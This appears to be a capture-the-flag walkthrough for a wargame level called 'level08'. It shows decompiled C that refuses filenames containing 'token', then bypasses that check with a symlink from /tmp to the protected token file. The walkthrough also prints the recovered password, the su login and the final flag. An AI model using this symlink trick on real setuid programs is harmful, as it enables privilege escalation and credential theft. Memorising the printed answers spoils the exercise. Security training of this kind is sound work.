```sh
$> ls -l ~
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

I decompiled `level08` :
```c
[...]
s = strstr(argv[1], "token");
if (s != NULL)
{
	printf("You may not access \'%s\'\n", argv[1]);
	exit(1);
}
[...]
```

We cannot access `token` because it is hard checked. We can use a symbolic link to `token` though.

```sh
$> ln -s ~/token /tmp/tst

$> ./level08 /tmp/tst
quif5eloekouj29ke0vouxean

$> su flag08
Password: quif5eloekouj29ke0vouxean

$> getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
